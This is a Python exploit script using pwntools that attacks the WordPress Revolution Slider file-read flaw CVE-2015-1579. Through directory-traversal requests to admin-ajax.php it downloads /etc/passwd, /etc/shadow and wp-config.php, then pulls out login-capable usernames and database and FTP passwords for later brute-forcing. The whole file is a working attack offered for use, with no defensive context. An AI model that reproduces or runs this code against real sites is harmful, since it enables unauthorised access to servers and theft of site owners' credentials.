from pwn import *
import urllib2
import sys
from datetime import datetime

def passive(domain):
    log.info('Trying CVE-2015-1579')

    dico = ['DB','FTP','KEY','SALT','DOMAIN',]
    users = []
    serviceU = []
    passwords = []

    shadowFound = False

    p = log.progress('Remote Files')
    p.status('Downloading /etc/passwd')
    etcpasswd = ""
    try:
        etcpasswd = urllib2.urlopen(domain+'wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../../etc/passwd')
    except:
        log.failure('Cannot download /etc/passwd')
    try:
        etcpasswd = etcpasswd.read()
    except:
        log.failure("Can't read /etc/passwd")
    if len(etcpasswd) == 0:
        log.failure('Empty /etc/passwd')
    else:
        log.success('Got /etc/passwd')
        p.status('Parsing Users')
        for line in etcpasswd.split('\n'):
            try:
                if "false" not in line.split(':')[6] and "nologin" not in line.split(':')[6]:
                    u = line.split(':')[0]
                    if u != "sync" and u != "shutdown" and u != "halt" and u != "mysql":
                        users.append(u)
            except:
                pass
        try:
            p.status('Trying /etc/shadow')
            shadow = urllib2.urlopen('http://'+domain+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../../etc/shadow')
            shadow = shadow.read()
            if shadow.replace(" ", ""):
                shadowFound = True
                log.success("May have found the /etc/shadow file")
        except:
            pass

    p.status('Downloading config file')

    wp_configs = ""
    try:
        wp_configs = urllib2.urlopen(domain+'wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php')
    except:
        log.failure('Cannot download config fIle')
    try:
        wp_configs = wp_configs.read()
    except:
        pass
    if len(wp_configs) == 0:
        log.failure('Empty config file')
    else:
    #print wp_configs
        log.success('Got the config file!')
        p.status('Parsing file')
        wp_configs = wp_configs.split('\n')
        for line in wp_configs:
            for term in dico:
                if term in line and len(line.split("'")) == 5:
                    description = line.split("'")[1]
                    value = line.split("'")[3]
                    #log.success('Found a '+description+" : "+value)
                    if "USER" in description: 
                        serviceU.append(value)
                    elif "PASS" in description and value not in passwords:
                        if value.replace(" ", ""):
                            passwords.append(value)
                    break
    if len(serviceU) > 0:
        log.success('Found a total of '+str(len(serviceU))+' service users')

    if len(users) > 0:
        foundUsers = True
        log.success('Found a total of '+str(len(users))+' users with login rights!')
        userlist = ""
        for user in users:
            userlist += user+','
        userlist = userlist[0:len(userlist)-1]
        log.info(userlist)
    	p.status("Prioritize wp-user")
    	if "wp-user" in users:
        	index = users.index("wp-user")
        	users[index] = users[0]
        	users[0] = "wp-user"
    else:
        log.failure('Could not find any user')
    if len(passwords) > 0:
        foundPasswords = True
        log.success('Found a total of '+str(len(passwords))+' passwords!')    
    else:
        log.failure('No password found')
    if shadowFound:
        log.info("You may have the shadow file. No brute-force will happen")

    retValue = []
    for user in users:
        retValue.append(('user',user))
    for passwd in passwords:
        retValue.append(('password',passwd))
    if len(retValue) == 0:
        retValue = [("none",False)]
    return retValue

def active(url):
	return passive(url)
